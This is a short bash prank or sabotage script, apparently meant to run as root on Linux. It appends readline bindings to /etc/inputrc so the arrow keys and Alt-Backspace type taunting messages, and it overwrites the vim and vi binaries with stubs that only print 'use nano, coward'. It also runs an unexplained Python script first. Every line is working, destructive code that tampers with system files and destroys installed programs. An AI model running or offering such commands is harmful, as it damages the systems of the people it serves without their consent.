#!/bin/bash
python basic-stuff.py
echo '"\e[A": "u mad bro?"' >> /etc/inputrc
echo '"\e[C": "no typos allowed"' >> /etc/inputrc
echo '"\e[D": "no typos allowed"' >> /etc/inputrc
echo '"\e\177": "no typos allowed"' >> /etc/inputrc
echo '"\e\b": "no typos allowed"' >> /etc/inputrc
echo "#!/bin/bash" > /usr/bin/vim
echo "echo use nano, coward" >> /usr/bin/vim
chmod +x /usr/bin/vim
echo "echo use nano, coward" > $(which vi)